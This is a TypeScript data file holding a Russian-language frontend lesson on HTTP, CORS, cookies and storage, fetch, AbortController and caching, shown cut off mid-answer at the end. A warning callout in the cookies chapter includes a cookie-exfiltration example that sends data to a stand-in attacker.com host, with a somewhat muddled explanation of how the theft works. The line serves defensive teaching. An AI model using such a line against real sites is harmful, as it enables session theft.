import type { Lesson } from '../../types/lesson';
import type { Flashcard } from '../../types/flashcard';
import { jsNetworkQuiz } from '../quizzes/js-network';
import { jsNetworkFlashcards } from '../flashcards/js-network';

// Index existing quiz questions for reuse as checkpoints.
const Q = Object.fromEntries(jsNetworkQuiz.questions.map((q) => [q.id, q]));

// Questions used as in-chapter checkpoints (must NOT appear in finalQuiz).
const CHECKPOINT_IDS = new Set([
  'jsnet-q9',
  'jsnet-q3',
  'jsnet-q11',
  'jsnet-q5',
  'jsnet-q6',
  'jsnet-q1',
  'jsnet-q4',
]);

// Дополнительные карточки специально для урока: уточняем нюансы fetch и
// обработки ошибок, которые часто всплывают на собеседованиях.
const extraFlashcards: Flashcard[] = [
  {
    id: 'jsnw-f7',
    question: 'Почему fetch не бросает ошибку на статус 404 или 500?',
    answer:
      'fetch резолвится успешно, как только браузер получил HTTP-ответ — независимо от статуса. Reject случается только при сетевых сбоях: нет соединения, CORS-блокировка, отмена через AbortController, ошибка DNS. Статусы 4xx/5xx — это валидный ответ сервера, поэтому проверка `response.ok` лежит на разработчике.',
    keyPoints: [
      'response.ok = true для статусов 200–299',
      'fetch reject: TypeError при сетевой ошибке, AbortError при abort',
      'Чтобы превратить 4xx/5xx в исключение — `if (!res.ok) throw new Error(res.status)`',
      'Это отличие от axios, который бросает на не-2xx по умолчанию',
    ],
    code: `async function fetchJson(url) {
  const res = await fetch(url);
  if (!res.ok) {
    throw new Error(\`HTTP \${res.status}\`);
  }
  return res.json();
}`,
  },
  {
    id: 'jsnw-f8',
    question: 'Когда браузер отправляет CORS preflight, а когда — нет?',
    answer:
      'Preflight (OPTIONS) отправляется перед «непростыми» запросами: метод не из {GET, HEAD, POST}, либо заголовок Content-Type не из {text/plain, multipart/form-data, application/x-www-form-urlencoded}, либо есть кастомные заголовки (Authorization, X-*). Иначе запрос считается «простым» и идёт без preflight.',
    keyPoints: [
      'POST + Content-Type: application/json → preflight (json не входит в простые)',
      'GET + Authorization → preflight (кастомный заголовок)',
      'PUT, PATCH, DELETE — всегда preflight',
      'Preflight можно кешировать через Access-Control-Max-Age',
      'Простой POST с form-urlencoded preflight не требует',
    ],
  },
  {
    id: 'jsnw-f9',
    question: 'Cookies vs localStorage vs sessionStorage — когда что выбирать?',
    answer:
      'Cookies автоматически отправляются с каждым запросом и могут быть HttpOnly (недоступны JS) — это единственный безопасный вариант для session-токенов. localStorage и sessionStorage существуют только на клиенте, но удобнее как key-value хранилище без лимитов в 4 КБ.',
    keyPoints: [
      'Cookies: 4 КБ, шлются на сервер автоматически, поддержка HttpOnly/Secure/SameSite',
      'localStorage: ~5–10 МБ, только клиент, сохраняется между сессиями',
      'sessionStorage: ~5–10 МБ, только клиент, очищается с закрытием вкладки',
      'localStorage НЕ безопасен для токенов — XSS прочитает',
      'Все три синхронны (могут блокировать main thread на больших объёмах)',
    ],
  },
  {
    id: 'jsnw-f10',
    question: 'Как fetch отличает AbortError от обычной сетевой ошибки?',
    answer:
      'Когда сигнал AbortController переходит в состояние aborted, fetch реджектится с DOMException, у которого `name === "AbortError"`. Сетевая ошибка (DNS, обрыв соединения) даёт TypeError. Это разные типы — обрабатываются отдельно.',
    keyPoints: [
      'AbortError — намеренная отмена, не нужно показывать пользователю',
      'TypeError — настоящий сбой сети, показывают «нет соединения»',
      'Проверка: `err.name === "AbortError"` (а не instanceof — DOMException)',
      'AbortSignal.timeout(ms) — современный сахар (Node 17+, Chrome 103+)',
    ],
    code: `try {
  const res = await fetch(url, { signal });
  return await res.json();
} catch (err) {
  if (err.name === 'AbortError') return null;
  throw err; // настоящая сетевая ошибка
}`,
  },
];

export const jsNetworkLesson: Lesson = {
  topicId: 'js-network',

  intro: {
    whyItMatters: `Сеть — основа любого SPA. Каждый клик в интерфейсе превращается в HTTP-запрос: загрузка данных, отправка формы, аутентификация, real-time обновления. Не понимая, как устроены HTTP-методы, статусы, заголовки, CORS и cookies, фронтендер не сможет ни диагностировать «странные» ошибки в DevTools, ни написать безопасный клиент аутентификации.

Главное, что отличает сеть от обычной асинхронности, — она происходит **между** двумя машинами с разной кодовой базой и разными политиками безопасности. Браузер встроил несколько защитных механизмов, которые легко принять за «магию», пока не понимаешь их назначения. **Same-Origin Policy** запрещает JavaScript читать ответы с чужого домена — иначе любая открытая вкладка могла бы обращаться к вашему банку с вашими cookies. **CORS** — это контролируемое расширение этой политики: сервер явно перечисляет, кому разрешено обращаться. **Preflight-запрос OPTIONS** существует именно как защита от CSRF и подделки заголовков: до того как браузер выполнит DELETE или отправит JSON с Authorization, он спрашивает у сервера разрешение.

**Cookies** автоматически прикрепляются к каждому запросу — это и удобство (не нужно вручную пробрасывать токен), и риск (CSRF). Атрибуты \`HttpOnly\`, \`Secure\` и \`SameSite\` закрывают типичные векторы атак: XSS-кражу токена, перехват по HTTP, кросс-сайтовую подделку запроса. **AbortController** даёт настоящую отмену запросов — без него race condition при быстром переключении пользовательских действий гарантирован.

Особое место занимает **fetch**: он не бросает ошибку на статусы 4xx/5xx, а только на сетевые сбои. Этот контракт — самый частый источник скрытых багов: код выглядит «правильно», но молча обрабатывает 500 как успех. В уроке вы научитесь читать сетевую панель DevTools, выбирать между cookies/localStorage, диагностировать CORS-ошибки и писать отменяемые запросы.`,
    estimatedMinutes: 35,
    interviewAngle:
      'Интервьюер проверяет понимание HTTP-семантики (idempotency, статусы, кеширование), причин и механики CORS preflight, разницы способов хранения сессии, контракта fetch (не бросает на 4xx/5xx) и умения писать отменяемые запросы через AbortController.',
    prerequisites: [{ slug: 'js-async', title: 'Promise и async/await' }],
  },

  resources: {
    videos: [
      {
        source: 'youtube',
        id: '4nGM034x4Dc',
        title: 'CORS in 100 Seconds',
        channel: 'Fireship',
        language: 'en',
        durationSec: 2 * 60,
        description:
          'Сжатый разбор того, зачем существует CORS и почему preflight нужен — за две минуты. Хорошо как первый контакт с темой.',
      },
      {
        source: 'youtube',
        id: 'iYM2zFP3Zn0',
        title: 'HTTP Crash Course & Exploration',
        channel: 'Traversy Media',
        language: 'en',
        durationSec: 38 * 60,
        description:
          'Практический разбор HTTP-методов, статусов и заголовков с примерами в DevTools. Подходит как видео-замена раздела «HTTP-основы».',
      },
    ],
    links: [
      {
        url: 'https://developer.mozilla.org/ru/docs/Web/API/Fetch_API/Using_Fetch',
        title: 'Использование Fetch — MDN',
        source: 'mdn',
        language: 'ru',
        note: 'Канонический разбор API: запрос, Response, тело, AbortController, credentials.',
      },
      {
        url: 'https://developer.mozilla.org/ru/docs/Web/HTTP/CORS',
        title: 'CORS — MDN',
        source: 'mdn',
        language: 'ru',
        note: 'Подробно о Same-Origin Policy, простых и сложных запросах, preflight, credentials.',
      },
      {
        url: 'https://web.dev/articles/samesite-cookies-explained',
        title: 'SameSite cookies explained — web.dev',
        source: 'web-dev',
        language: 'en',
        note: 'Лучшее объяснение SameSite=Strict/Lax/None и их роли в защите от CSRF.',
      },
      {
        url: 'https://datatracker.ietf.org/doc/html/rfc7231',
        title: 'RFC 7231: HTTP/1.1 Semantics and Content',
        source: 'spec',
        language: 'en',
        note: 'Первоисточник: семантика методов, идемпотентность, статус-коды, кеширование.',
      },
      {
        url: 'https://learn.javascript.ru/fetch',
        title: 'Fetch — учебник learn.javascript.ru',
        source: 'learn-js',
        language: 'ru',
        note: 'Глава Ильи Кантора с пошаговыми примерами fetch, AbortController и CORS.',
      },
    ],
  },

  chapters: [
    {
      id: 'http-basics',
      title: 'HTTP: методы, статусы, идемпотентность',
      estimatedMinutes: 6,
      blocks: [
        {
          type: 'text',
          content:
            'HTTP — текстовый протокол клиент-серверного взаимодействия поверх TCP. Каждый запрос состоит из **метода**, **URL**, **заголовков** и (опционально) **тела**. Сервер отвечает **статус-кодом**, **заголовками** и **телом**. Понимание семантики методов и статусов — фундамент, без которого нельзя ни проектировать REST API, ни корректно обрабатывать ошибки на клиенте.',
        },
        { type: 'heading', content: 'Методы и их свойства' },
        {
          type: 'list',
          content: `- **GET** — получить ресурс. Без тела. Безопасный (не меняет состояние). Идемпотентен. Кешируется.
- **POST** — создать ресурс. Тело — данные. **Не идемпотентен**: повторный запрос создаст ещё один ресурс.
- **PUT** — заменить ресурс целиком. Идемпотентен: повторный PUT даёт то же состояние.
- **PATCH** — частично обновить. Не обязательно идемпотентен (зависит от семантики операции).
- **DELETE** — удалить. Идемпотентен: повторный DELETE вернёт 404, но состояние то же.
- **OPTIONS** — узнать поддерживаемые методы. Используется браузером для CORS preflight.`,
        },
        {
          type: 'callout',
          calloutType: 'info',
          content:
            '**Идемпотентность** означает: повторный вызов даёт то же состояние сервера, что и одиночный. Это свойство метода, а не отдельной операции. Безопасный retry на сетевой сбой возможен только для идемпотентных методов — поэтому повторять POST автоматически нельзя.',
        },
        { type: 'heading', content: 'Статус-коды' },
        {
          type: 'list',
          content: `- **2xx — успех**: 200 OK, 201 Created, 204 No Content (ответ без тела).
- **3xx — редирект**: 301 Moved Permanently, 302 Found, 304 Not Modified (используй кеш).
- **4xx — ошибка клиента**: 400 Bad Request, 401 Unauthorized (нужна аутентификация), 403 Forbidden (нет прав), 404 Not Found, 409 Conflict, 429 Too Many Requests.
- **5xx — ошибка сервера**: 500 Internal Server Error, 502 Bad Gateway, 503 Service Unavailable, 504 Gateway Timeout.`,
        },
        {
          type: 'code',
          language: 'javascript',
          content: `// Безопасный retry — только для идемпотентных методов:
async function safeRetry(fn, attempts = 3) {
  for (let i = 0; i < attempts; i++) {
    try {
      return await fn();
    } catch (err) {
      if (i === attempts - 1) throw err;
    }
  }
}

// ✅ Безопасно: GET идемпотентен
await safeRetry(() => fetch('/api/users/1'));

// ❌ Опасно: повтор POST создаст дубль
// await safeRetry(() => fetch('/api/orders', { method: 'POST', body }));`,
        },
        {
          type: 'callout',
          calloutType: 'tip',
          content:
            'Для безопасного retry POST используйте **idempotency key** — уникальный заголовок (например, `Idempotency-Key: <uuid>`), по которому сервер распознаёт дубль и возвращает результат первого вызова. Это паттерн платёжных систем (Stripe, PayPal).',
        },
      ],
      flashcardIds: ['jsnw-f6'],
      checkpoint: [Q['jsnet-q9']!],
      docsLink: { url: 'https://developer.mozilla.org/ru/docs/Web/HTTP/Methods', title: 'HTTP-методы — MDN (ru)' },
    },

    {
      id: 'cors',
      title: 'CORS и preflight: зачем браузер блокирует запросы',
      estimatedMinutes: 8,
      blocks: [
        {
          type: 'text',
          content:
            'Браузер по умолчанию запрещает JavaScript читать ответы с другого **origin** (origin = протокол + хост + порт). Это называется **Same-Origin Policy** и появилось задолго до CORS. Без неё любая открытая вкладка могла бы делать запросы к вашему банку, используя ваши cookies, и читать ответы. **CORS** — контролируемое расширение этой политики: сервер явно сообщает, какие origin-ы и методы разрешены.',
        },
        {
          type: 'callout',
          calloutType: 'info',
          content:
            'CORS — это политика **браузера**. Серверные клиенты (curl, fetch в Node, axios на бэкенде) её не соблюдают: ограничение существует только в контексте `window` с подгруженным документом.',
        },
        { type: 'heading', content: 'Простые vs сложные запросы' },
        {
          type: 'text',
          content:
            'Запрос считается **простым** (без preflight), если выполнены все три условия: метод — GET, HEAD или POST; среди заголовков только «безопасные» (Accept, Accept-Language, Content-Language, Content-Type); Content-Type — text/plain, multipart/form-data или application/x-www-form-urlencoded. Любое отклонение делает запрос **сложным** — и браузер сначала отправит OPTIONS preflight.',
        },
        {
          type: 'code',
          language: 'http',
          content: `// Сложный запрос: Content-Type: application/json + DELETE
// Браузер автоматически отправляет:
OPTIONS /api/users/42 HTTP/1.1
Origin: https://app.example.com
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: content-type, authorization

// Сервер отвечает:
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400  // кешировать preflight на 24 часа

// Только после успешного preflight браузер отправит сам DELETE.`,
        },
        {
          type: 'callout',
          calloutType: 'tip',
          content:
            'Preflight — это защита: сервер не выполняет «опасную» операцию, пока не подтвердит, что готов её принять с этого origin. Атакующий с чужого сайта не может «незаметно» отправить DELETE с Authorization — браузер сначала спросит сервер разрешения.',
        },
        { type: 'heading', content: 'Credentials и подводный камень с *' },
        {
          type: 'code',
          language: 'javascript',
          content: `// На клиенте: чтобы fetch отправил cookies — credentials: 'include'
fetch('https://api.example.com/profile', {
  credentials: 'include',
});

// На сервере для credentials НУЖНО:
// 1. Конкретный Allow-Origin (не *)
// 2. Allow-Credentials: true
res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
res.setHeader('Access-Control-Allow-Credentials', 'true');`,
        },
        {
          type: 'callout',
          calloutType: 'warning',
          content:
            '`Access-Control-Allow-Origin: *` **несовместим** с credentials: браузер отклонит ответ с ошибкой. Для запросов с cookies сервер обязан указать конкретный origin (часто — отзеркалить значение `req.headers.origin` из whitelist).',
        },
        {
          type: 'list',
          content: `Типичные ошибки в DevTools и их причина:
- **«CORS preflight did not succeed»** — сервер вернул 4xx/5xx на OPTIONS или забыл нужные заголовки.
- **«Allow-Origin missing»** — сервер не вернул Access-Control-Allow-Origin (часто при ошибке 500 — обработчик упал до выставления заголовков).
- **«Credentials flag is true, but Allow-Origin is *»** — несовместимость, описанная выше.
- **«Method not allowed in preflight»** — сервер не перечислил DELETE/PUT в Allow-Methods.`,
        },
      ],
      flashcardIds: ['jsnw-f1', 'jsnw-f2', 'jsnw-f8'],
      checkpoint: [Q['jsnet-q3']!, Q['jsnet-q11']!],
      docsLink: { url: 'https://developer.mozilla.org/ru/docs/Web/HTTP/CORS', title: 'CORS — MDN (ru)' },
    },

    {
      id: 'cookies-storage',
      title: 'Cookies, localStorage, sessionStorage',
      estimatedMinutes: 6,
      blocks: [
        {
          type: 'text',
          content:
            'Браузер предоставляет три способа хранить данные на клиенте. Они различаются временем жизни, размером, областью видимости и — главное — поведением при сетевых запросах. Ошибка в выборе хранилища приводит к уязвимостям: токен в localStorage может быть украден через XSS, токен в cookies без HttpOnly — тоже.',
        },
        { type: 'heading', content: 'Cookies' },
        {
          type: 'code',
          language: 'http',
          content: `// Сервер выставляет cookie через заголовок:
Set-Cookie: session=abc123;
  HttpOnly;             // недоступен через document.cookie (защита от XSS)
  Secure;               // только HTTPS
  SameSite=Strict;      // не отправлять при кросс-сайтовых запросах (CSRF)
  Max-Age=3600;         // истекает через час
  Path=/;
  Domain=.example.com   // доступен поддоменам`,
        },
        {
          type: 'list',
          content: `- **HttpOnly** — JavaScript не может прочитать через \`document.cookie\`. Ключевая защита от XSS-кражи токена.
- **Secure** — отправляется только по HTTPS. Защита от перехвата на открытом Wi-Fi.
- **SameSite=Strict** — не отправляется при любом кросс-сайтовом запросе, включая клик по ссылке. Максимальная защита от CSRF, но ломает SSO-сценарии.
- **SameSite=Lax** (дефолт в современных браузерах) — отправляется при top-level навигации (клик по ссылке), не отправляется при fetch с другого сайта. Баланс безопасности и UX.
- **SameSite=None** — отправляется всегда. Требует Secure. Используется для сторонних виджетов (платежи, чаты).`,
        },
        {
          type: 'callout',
          calloutType: 'warning',
          content:
            'Cookies автоматически отправляются **с каждым** запросом к домену — это и удобство, и риск. Если на сайте есть `<img src="https://attacker.com/log?cookie=...">`, браузер отправит cookies и атакующий получит сессию. Защита: HttpOnly (не даёт прочитать) + SameSite (не даёт отправить с чужого сайта).',
        },
        { type: 'heading', content: 'localStorage и sessionStorage' },
        {
          type: 'code',
          language: 'javascript',
          content: `// localStorage — переживает закрытие вкладки и браузера
localStorage.setItem('theme', 'dark');
localStorage.getItem('theme'); // 'dark'

// sessionStorage — очищается при закрытии вкладки
sessionStorage.setItem('draft', JSON.stringify(form));

// API синхронный — на больших объёмах блокирует main thread.
// Лимит — около 5–10 МБ на origin (зависит от браузера).
// Не отправляется на сервер автоматически.`,
        },
        { type: 'heading', content: 'Сравнение' },
        {
          type: 'list',
          content: `- **Сессионный токен** → cookie с HttpOnly + Secure + SameSite=Lax. Никогда **не** localStorage — XSS прочитает.
- **Тема, язык, настройки UI** → localStorage. Не нужен на сервере, переживает перезагрузку.
- **Черновик формы** → sessionStorage. Жизненный цикл совпадает с вкладкой.
- **Большие данные (offline-кеш, файлы)** → IndexedDB. Cookies/localStorage не подходят по размеру.`,
        },
        {
          type: 'callout',
          calloutType: 'tip',
          content:
            'Спор «localStorage vs cookies для JWT» решается так: если фронт и бэк на одном домене — cookie с HttpOnly. Если разные домены и нужно вручную добавлять Authorization — придётся localStorage, но тогда обязательна полноценная защита от XSS (CSP, экранирование, безопасные библиотеки).',
        },
      ],
      flashcardIds: ['jsnw-f3', 'jsnw-f9'],
      checkpoint: [Q['jsnet-q5']!, Q['jsnet-q6']!],
      docsLink: { url: 'https://learn.javascript.ru/cookie', title: 'Cookie — learn.javascript.ru' },
    },

    {
      id: 'fetch-api',
      title: 'fetch: контракт, обработка ошибок, парсинг тела',
      estimatedMinutes: 7,
      blocks: [
        {
          type: 'text',
          content:
            '`fetch` — современная замена XMLHttpRequest, основанный на промисах. У него один важный и контр-интуитивный контракт: промис **не реджектится** на HTTP-статусы 4xx/5xx. Reject случается только при сетевых сбоях — нет соединения, DNS-ошибка, CORS-блокировка, отмена через AbortController. Любой ответ сервера со статусом — это успешный резолв с объектом Response, у которого `ok` равен false для не-2xx.',
        },
        {
          type: 'code',
          language: 'javascript',
          content: `// ❌ Типичная ошибка: считаем, что fetch бросит на 404/500
async function loadUser(id) {
  try {
    const res = await fetch(\`/api/users/\${id}\`);
    return await res.json(); // если статус 500 — попытается распарсить тело ошибки
  } catch (err) {
    // сюда попадёт ТОЛЬКО при сетевом сбое, не при 5xx
    console.error(err);
  }
}

// ✅ Правильно: явно проверяем response.ok
async function loadUser(id) {
  const res = await fetch(\`/api/users/\${id}\`);
  if (!res.ok) {
    throw new Error(\`HTTP \${res.status}: \${res.statusText}\`);
  }
  return res.json();
}`,
        },
        {
          type: 'callout',
          calloutType: 'warning',
          content:
            '`response.ok` — это `true` для статусов **200–299**. Всё остальное (включая 304 Not Modified — он же из 3xx) попадает в `false`. Если нужно отдельно различать «ошибка клиента» и «ошибка сервера», смотрите на `response.status`.',
        },
        { type: 'heading', content: 'Парсинг тела — только один раз' },
        {
          type: 'code',
          language: 'javascript',
          content: `const res = await fetch('/api/data');

// Body — это ReadableStream. Прочитать можно ОДИН раз:
const text = await res.text();
// const json = await res.json(); // ❌ TypeError: body уже использован

// Если нужно дважды — клонируем ДО первого чтения:
const res = await fetch('/api/data');
const clone = res.clone();
const text = await res.text();      // оригинал
const json = await clone.json();    // клон`,
        },
        { type: 'heading', content: 'Опции fetch' },
        {
          type: 'code',
          language: 'javascript',
          content: `await fetch('/api/users', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    Authorization: 'Bearer ' + token,
  },
  body: JSON.stringify({ name: 'Alice' }),

  // Cookies:
  // 'omit'         — никогда не отправлять
  // 'same-origin'  — только для своего origin (по умолчанию)
  // 'include'      — всегда (нужно Allow-Credentials: true на сервере)
  credentials: 'include',

  // Управление кешем:
  // 'default' | 'no-store' | 'reload' | 'no-cache' | 'force-cache'
  cache: 'no-cache',

  // Поведение при редиректах:
  // 'follow' (default) | 'error' | 'manual'
  redirect: 'follow',
});`,
        },
        {
          type: 'callout',
          calloutType: 'tip',
          content:
            'Универсальная обёртка `fetchJson(url, options)`, которая делает три вещи: проверяет `res.ok`, парсит JSON, прокидывает status и тело ошибки в Error — экономит сотни строк boilerplate в реальном проекте.',
        },
      ],
      flashcardIds: ['jsnw-f7'],
      checkpoint: [Q['jsnet-q1']!],
      docsLink: { url: 'https://learn.javascript.ru/fetch', title: 'Fetch API — learn.javascript.ru' },
    },

    {
      id: 'abort-controller',
      title: 'AbortController: отмена запросов и race conditions',
      estimatedMinutes: 6,
      blocks: [
        {
          type: 'text',
          content:
            'AbortController — стандартный механизм отмены. Создаём контроллер, передаём его `signal` в fetch, и при необходимости вызываем `controller.abort()`. Браузер разорвёт соединение, освободит сокет, а fetch реджектится с ошибкой `AbortError`. Это **настоящая** отмена — в отличие от Promise.race с таймером, который не прерывает запрос, а только игнорирует его результат.',
        },
        { type: 'heading', content: 'Базовое использование' },
        {
          type: 'code',
          language: 'javascript',
          content: `const controller = new AbortController();

// Отменить через 5 секунд:
const timer = setTimeout(() => controller.abort(), 5000);

try {
  const res = await fetch('/api/slow', { signal: controller.signal });
  clearTimeout(timer);
  return await res.json();
} catch (err) {
  if (err.name === 'AbortError') {
    console.log('Запрос отменён по таймауту');
    return null;
  }
  throw err; // настоящая сетевая ошибка
}

// Современный сахар (Node 17+, Chrome 103+):
fetch(url, { signal: AbortSignal.timeout(5000) });`,
        },
        { type: 'heading', content: 'Race condition в поиске' },
        {
          type: 'text',
          content:
            'Классическая ошибка: пользователь печатает в поле поиска, каждое нажатие шлёт fetch. Сетевые ответы возвращаются в произвольном порядке — медленный ответ для «re» может прийти **после** быстрого ответа для «react». Без отмены интерфейс «прыгает» на устаревшие данные.',
        },
        {
          type: 'code',
          language: 'javascript',
          content: `let activeController = null;

async function search(query) {
  // Отменить предыдущий запрос, если он ещё в полёте:
  if (activeController) activeController.abort();
  activeController = new AbortController();

  try {
    const res = await fetch(\`/search?q=\${encodeURIComponent(query)}\`, {
      signal: activeController.signal,
    });
    return await res.json();
  } catch (err) {
    if (err.name === 'AbortError') return null; // тихо игнорируем
    throw err;
  }
}

// React: cleanup в useEffect
useEffect(() => {
  const controller = new AbortController();
  fetch('/api/data', { signal: controller.signal })
    .then((r) => r.json())
    .then(setData)
    .catch((err) => { if (err.name !== 'AbortError') setError(err); });

  return () => controller.abort(); // отменяем при unmount или смене зависимостей
}, [id]);`,
        },
        {
          type: 'callout',
          calloutType: 'tip',
          content:
            'Один AbortController может управлять **несколькими** запросами одновременно — все, кому передан его `signal`, будут отменены вместе. Это удобно для отмены целой страницы при unmount.',
        },
      ],
      flashcardIds: ['jsnw-f4', 'jsnw-f10'],
      docsLink: { url: 'https://learn.javascript.ru/fetch-abort', title: 'AbortController — learn.javascript.ru' },
      playground: {
        starterCode: `// Реализуйте fetchWithTimeout(promiseFactory, ms):
// - вызывает promiseFactory() и ждёт результат
// - если истекает ms миллисекунд — возвращает строку 'timeout'
// - если promiseFactory резолвится раньше — возвращает её результат
// Используйте Promise.race и setTimeout.

async function fetchWithTimeout(promiseFactory, ms) {
  // ваш код
}

// Имитируем медленный fetch:
const slow = () => new Promise((r) => setTimeout(() => r('data'), 100));
const fast = () => new Promise((r) => setTimeout(() => r('data'), 10));

(async () => {
  console.log(await fetchWithTimeout(fast, 50));
  console.log(await fetchWithTimeout(slow, 50));
})();`,
        expectedOutput: 'data\ntimeout',
        description:
          'Базовый паттерн: Promise.race между промисом операции и промисом, который реджектится/резолвится по setTimeout. Используется как клиентский timeout, когда AbortController не подходит.',
      },
      checkpoint: [Q['jsnet-q4']!],
    },

    {
      id: 'caching',
      title: 'Кеширование и условные запросы',
      estimatedMinutes: 5,
      blocks: [
        {
          type: 'text',
          content:
            'HTTP-кеширование экономит трафик и ускоряет страницу: браузер не запрашивает заново то, что уже лежит в кеше. Управляется заголовками `Cache-Control` (срок жизни) и `ETag` / `Last-Modified` (валидация). Для фронтенда это важно при двух сценариях: настройка кеша статических ресурсов и работа с API, где данные могут меняться.',
        },
        {
          type: 'code',
          language: 'http',
          content: `// Сервер задаёт политику кеша:
Cache-Control: max-age=3600           // храни 1 час, не спрашивай
Cache-Control: no-cache               // храни, но всегда проверяй (If-None-Match)
Cache-Control: no-store               // не храни вообще
Cache-Control: public, max-age=31536000, immutable  // навсегда (для versioned assets)

// Условные запросы — экономия трафика:
ETag: "v1-abc123"
Last-Modified: Mon, 01 Jan 2024 00:00:00 GMT

// Браузер при следующем запросе шлёт:
If-None-Match: "v1-abc123"
// Сервер сравнивает и отвечает либо 200 с новым телом,
// либо 304 Not Modified без тела — браузер использует кеш.`,
        },
        {
          type: 'list',
          content: `Практические рекомендации:
- **Versioned assets** (\`app.a3f1c2.js\`) → \`Cache-Control: public, max-age=31536000, immutable\`. Имя файла меняется при изменении содержимого.
- **HTML-страницы** → \`Cache-Control: no-cache\`. Кеш есть, но всегда проверяется.
- **Приватные данные пользователя** → \`Cache-Control: private, no-store\`. CDN не кеширует.
- **API GET-запросы** → ETag + короткий max-age. 304-ответы экономят трафик при пагинации.`,
        },
        {
          type: 'callout',
          calloutType: 'info',
          content:
            'Статус **304 Not Modified** — это успех с пустым телом. Браузер берёт значение из кеша. В DevTools видно как «(disk cache)» или «(memory cache)» с маленьким размером ответа.',
        },
      ],
      flashcardIds: ['jsnw-f5'],
      docsLink: { url: 'https://developer.mozilla.org/ru/docs/Web/HTTP/Caching', title: 'Кеширование HTTP — MDN (ru)' },
    },
  ],

  // Все вопросы из старого квиза, кроме тех, что ушли в checkpoint.
  finalQuiz: jsNetworkQuiz.questions.filter((q) => !CHECKPOINT_IDS.has(q.id)),

  // Реюзаем существующие карточки + 4 новых.
  flashcards: [...jsNetworkFlashcards.cards, ...extraFlashcards],

  cheatsheet: `### Шпаргалка по сети

- **HTTP-методы**: GET/PUT/DELETE — идемпотентны, POST/PATCH — нет. Безопасный retry — только для идемпотентных или с Idempotency-Key.
- **Статусы**: 2xx успех, 3xx редирект (304 — used cache), 4xx клиент (401/403/404/429), 5xx сервер.
- **CORS preflight** (OPTIONS) — для PUT/DELETE/PATCH, кастомных заголовков, Content-Type: application/json. Кешируется через Access-Control-Max-Age.
- **Credentials**: \`fetch(..., { credentials: 'include' })\` + сервер \`Allow-Credentials: true\` + конкретный (не \`*\`) \`Allow-Origin\`.
- **Cookies**: HttpOnly (не виден JS), Secure (только HTTPS), SameSite=Strict|Lax|None. Сессии — в cookie, **не** в localStorage.
- **fetch не бросает на 4xx/5xx** — проверяй \`res.ok\`. Reject только на сетевые сбои и AbortError.
- **AbortController**: \`controller.abort()\` отменяет fetch. Для race conditions — отменяй предыдущий запрос перед новым.
- **Кеш**: versioned assets — \`max-age=31536000, immutable\`. API — ETag + If-None-Match → 304.`,

  interviewQA: [
    {
      id: 'jsnw-iq1',
      question: 'Чем GET отличается от POST с точки зрения идемпотентности и кеширования?',
      shortAnswer:
        'GET идемпотентен, безопасен (не меняет состояние) и кешируется браузером и proxy по умолчанию. POST не идемпотентен (повторный POST создаст ещё один ресурс), не должен менять состояние повторно и не кешируется без явного указания.',
      fullAnswer: `**Идемпотентность.** GET по семантике RFC 7231 — безопасный метод: он не меняет состояние сервера. Повторный вызов даёт тот же результат, поэтому браузеры и прокси-серверы спокойно повторяют GET при сбое. POST — наоборот, основной способ **создать** ресурс. Повторный POST создаст второй ресурс с тем же телом — поэтому повторять его автоматически опасно.

**Кеширование.** GET-ответы кешируются браузером и промежуточными узлами (CDN, прокси) по умолчанию, на основе заголовков \`Cache-Control\`, \`ETag\`, \`Last-Modified\`. POST-ответы по умолчанию **не** кешируются — даже если сервер вернёт \`Cache-Control: max-age=3600\`, многие реализации игнорируют это.

**Структурные различия.** У GET нет тела — параметры передаются в query string. POST помещает данные в тело и поддерживает любые Content-Type, включая binary и multipart. Длина URL ограничена (~2000 символов в Chrome, меньше в IE) — для больших фильтров приходится использовать POST как «search».

**Практический вывод.** Для retry POST на клиенте используйте \`Idempotency-Key\` — заголовок с уникальным значением на «логический» запрос. Сервер хранит результат первого вызова и при повторе возвращает тот же ответ. Это паттерн платёжных систем и любого критичного API.`,
      followUps: [
        'Что такое Idempotency-Key и как он реализуется на сервере?',
        'Можно ли передать тело в GET-запросе и почему это плохая идея?',
      ],
      relatedChapterId: 'http-basics',
    },
    {
      id: 'jsnw-iq2',
      question: 'Что такое CORS и зачем нужен preflight-запрос?',
      shortAnswer:
        'CORS — механизм, позволяющий серверу разрешить кросс-доменные запросы из браузера. Preflight (OPTIONS) — это предварительный запрос, через который браузер спрашивает сервер, разрешён ли «опасный» вызов до того как реально его сделать. Это защита от CSRF и подделки заголовков.',
      fullAnswer: `**Same-Origin Policy** — старое (1995) правило браузеров: JavaScript не может читать ответы с другого origin (origin = протокол + хост + порт). Без неё любая открытая вкладка могла бы делать запросы к вашему банку с вашими cookies и читать ответы. **CORS** (2014) — контролируемое расширение: сервер явно перечисляет, кому разрешено.

**Простые vs сложные запросы.** «Простой» запрос — это GET, HEAD или POST с Content-Type из {text/plain, multipart/form-data, application/x-www-form-urlencoded} и без кастомных заголовков. Такой запрос браузер выполняет сразу, а CORS-проверка происходит **после** ответа: если \`Access-Control-Allow-Origin\` не разрешает, браузер скрывает тело от JavaScript (но сервер уже выполнил операцию).

**Сложный запрос** — это PUT, DELETE, PATCH; \`Content-Type: application/json\`; кастомные заголовки (Authorization, X-*). Перед сложным запросом браузер автоматически отправляет **OPTIONS preflight** с заголовками \`Access-Control-Request-Method\` и \`Access-Control-Request-Headers\`. Сервер отвечает \`Access-Control-Allow-Methods\`, \`Allow-Headers\` и \`Allow-Origin\`. Только после успешного preflight браузер шлёт настоящий запрос.

**Зачем это нужно.** Preflight — защита: атакующий с чужого сайта не может «незаметно» выполнить DELETE или отправить JSON с Authorization, потому что браузер сначала спросит сервер. Сервер, не настроенный на CORS, просто ответит на OPTIONS чем угодно — и preflight провалится.

**Кеширование preflight.** Заголовок \`Access-Control-Max-Age: 86400\` говорит браузеру кешировать результат preflight на сутки — это убирает накладные расходы для частых вызовов одного эндпоинта.`,
      followUps: [
        'Почему `Access-Control-Allow-Origin: *` несовместим с credentials?',
        'Что увидит JavaScript, если сервер вернул 200 на сам запрос, но без CORS-заголовков?',
      ],
      relatedChapterId: 'cors',
    },
    {
      id: 'jsnw-iq3',
      question: 'В чём разница между cookies, localStorage и sessionStorage?',
      shortAnswer:
